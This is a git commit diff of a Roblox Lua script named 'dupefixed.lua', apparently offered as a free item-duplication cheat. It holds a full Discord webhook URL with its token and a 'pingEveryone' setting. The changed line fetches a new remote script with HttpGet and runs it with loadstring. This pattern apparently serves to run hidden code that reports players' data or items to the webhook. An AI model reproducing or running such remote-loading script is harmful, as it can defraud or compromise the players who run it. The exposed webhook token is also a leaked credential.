502717c17f79e295d29953bce0fca1867f5594bd
relapsedddd <callumlovesdad@gmail.com>
2025-04-17 23:59:08 -0600

    Update dupefixed.lua

--- dupefixed.lua
+++ dupefixed.lua
@@ -3,4 +3,4 @@ _G.min_chance = 10
 _G.pingEveryone = "Yes"
 _G.webhook = "https://discord.com/api/webhooks/1362547535981314239/lqxJyPNXM930Wdngi3KAEN6ShWmQMpRlQXai6raKt6QfzhpRhgMX5aQOaS6jEB3PHMiS"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/spookzv4/bubblegum/refs/heads/main/test.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spookzv4/bubblegum/refs/heads/main/FREEbgsi.lua"))()
